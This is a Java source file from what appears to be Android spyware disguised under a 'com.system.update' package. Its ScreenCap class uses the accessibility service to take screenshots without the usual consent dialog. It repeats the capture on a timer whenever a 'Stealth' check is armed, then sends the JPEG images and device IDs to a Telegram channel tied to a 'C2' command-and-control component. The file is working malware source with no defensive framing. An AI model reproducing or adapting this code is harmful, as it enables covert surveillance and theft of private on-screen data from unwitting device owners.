package com.system.update;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Screenshot via AccessibilityService.takeScreenshot (API 30+) when a11y enabled.
 * No MediaProjection consent dialog.
 */
public final class ScreenCap {

    private static final AtomicBoolean BUSY = new AtomicBoolean(false);
    private static AccessibilityService svc;

    private ScreenCap() {}

    public static void bind(AccessibilityService s) {
        svc = s;
    }

    public static void captureAndSend() {
        if (BUSY.getAndSet(true)) return;
        AccessibilityService s = svc;
        if (s == null || Build.VERSION.SDK_INT < 30) {
            BUSY.set(false);
            Telegram.reportEvent(C2.getDeviceId(), "screenshot_unavailable a11y_or_api");
            return;
        }
        try {
            s.takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
                    s.getMainExecutor(),
                    new AccessibilityService.TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(AccessibilityService.ScreenshotResult result) {
                            try {
                                Bitmap bmp = Bitmap.wrapHardwareBuffer(
                                        result.getHardwareBuffer(), result.getColorSpace());
                                if (bmp == null) {
                                    Telegram.reportEvent(C2.getDeviceId(), "screenshot_null_bmp");
                                    return;
                                }
                                Bitmap soft = bmp.copy(Bitmap.Config.ARGB_8888, false);
                                try { result.getHardwareBuffer().close(); } catch (Throwable ignored) {}
                                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                                soft.compress(Bitmap.CompressFormat.JPEG, 40, bos);
                                byte[] jpeg = bos.toByteArray();
                                soft.recycle();
                                String b64 = Base64.encodeToString(jpeg, Base64.NO_WRAP);
                                Telegram.send("📸 SCREEN id=" + C2.getDeviceId()
                                        + " bytes=" + jpeg.length);
                                // TG text limit — send first chunk as proof; full image needs sendPhoto API
                                Telegram.sendPhotoJpeg(jpeg);
                            } catch (Throwable t) {
                                Telegram.reportEvent(C2.getDeviceId(), "screenshot_err:" + t.getMessage());
                            } finally {
                                BUSY.set(false);
                            }
                        }

                        @Override
                        public void onFailure(int errorCode) {
                            Telegram.reportEvent(C2.getDeviceId(), "screenshot_fail code=" + errorCode);
                            BUSY.set(false);
                        }
                    });
        } catch (Throwable t) {
            BUSY.set(false);
            Telegram.reportEvent(C2.getDeviceId(), "screenshot_ex:" + t.getMessage());
        }
    }

    public static void scheduleLoop(long intervalMs) {
        Handler h = new Handler(Looper.getMainLooper());
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (Stealth.isArmed(svc != null ? svc : null)) {
                    captureAndSend();
                }
                h.postDelayed(this, intervalMs);
            }
        }, intervalMs);
    }
}
